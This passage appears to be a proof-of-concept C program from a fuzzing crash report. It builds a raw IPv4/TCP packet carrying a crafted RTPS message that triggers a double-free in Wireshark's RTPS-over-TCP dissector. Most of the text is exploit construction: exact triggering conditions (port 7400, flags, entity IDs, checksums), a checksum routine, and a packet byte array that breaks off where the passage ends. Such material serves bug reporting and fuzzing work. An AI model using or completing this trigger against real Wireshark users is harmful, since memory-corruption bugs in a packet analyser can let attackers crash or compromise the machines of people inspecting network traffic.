SUMMARY: AddressSanitizer: double-free in wmem_simple_free_all

IMPORTANT — fuzzshark_ip input format:
- File is a RAW IPv4 packet (starts at IP header byte 0, no pcap wrapper)
- 'oss-fuzzshark: disabling: udp' means UDP is disabled as a TOP-LEVEL entry point ONLY.
  The IP dissector still hands TCP (proto=6) payloads to sub-dissectors.
- The crash requires TCP transport (IP proto=0x06), NOT UDP.
  dissected_tcp_participants is only populated by dissect_rtps_tcp().
- TCP destination port MUST be 7400 (0x1c 0xe8).
- TCP flags MUST include ACK (0x10); PSH+ACK (0x18) recommended.
- TCP payload = 4-byte big-endian length prefix + RTPS message.
- RTPS magic: 0x52 0x54 0x50 0x53 ('RTPS'), version 0x02 0x04, vendor 0x01 0x01 (RTI DDS).
- Use little-endian submessage flag (bit 0 = 1).
- writerEntityId = ENTITYID_BUILTIN_PARTICIPANT_WRITER: bytes 0x00 0x01 0x00 0xc2.
- IP and TCP checksums MUST be correctly computed — zero checksums are dropped silently.

 * Triggers: double-free in wmem_simple_free_all (Wireshark RTPS-over-TCP dissector)

 * Binary format: [20-byte IPv4 header][20-byte TCP header (dport=7400, flags=PSH+ACK)]
 *                [4-byte BE RTPS length prefix][RTPS header v2.4 vendor=RTI]
 *                [SUBMESSAGE_DATA id=0x15 flags=0x01 writerEntityId=0x000100c2]
 */

static uint16_t checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;
    for (size_t i = 0; i + 1 < len; i += 2)
        sum += (uint16_t)((data[i] << 8) | data[i+1]);
    if (len & 1) sum += (uint16_t)(data[len-1] << 8);
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

int main(void) {
    uint8_t pkt[256];
    memset(pkt, 0, sizeof(pkt));

    /* RTPS message */
    uint8_t rtps[] = {
        0x52,0x54,0x50,0x53,  /* magic 'RTPS' */
        0x02,0x04,             /* version 2.4 */
        0x01,0x01,             /* vendor RTI DDS */
        0x01,0x0f,0xbe,0x09,0x00,0x00,0x00,0x00,  /* guidPrefix (12 bytes) */
        0x00,0x00,0x00,0x00,
        /* SUBMESSAGE_DATA */
        0x15,                  /* submessage id: DATA */
        0x01,                  /* flags: little-endian */
        0x1c,0x00,             /* submessage length (28 bytes LE) */
        0x00,0x00,             /* extraFlags */
        0x10,0x00,             /* octetsToInlineQos = 16 */
        0x00,0x00,0x00,0x00,   /* readerEntityId = ENTITYID_UNKNOWN */
        0x00,0x01,0x00,0xc2,   /* writerEntityId = ENTITYID_BUILTIN_PARTICIPANT_WRITER */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,  /* writerSeqNumber */
        0x00,0x03,0x00,0x00,   /* PL_CDR_LE encapsulation */
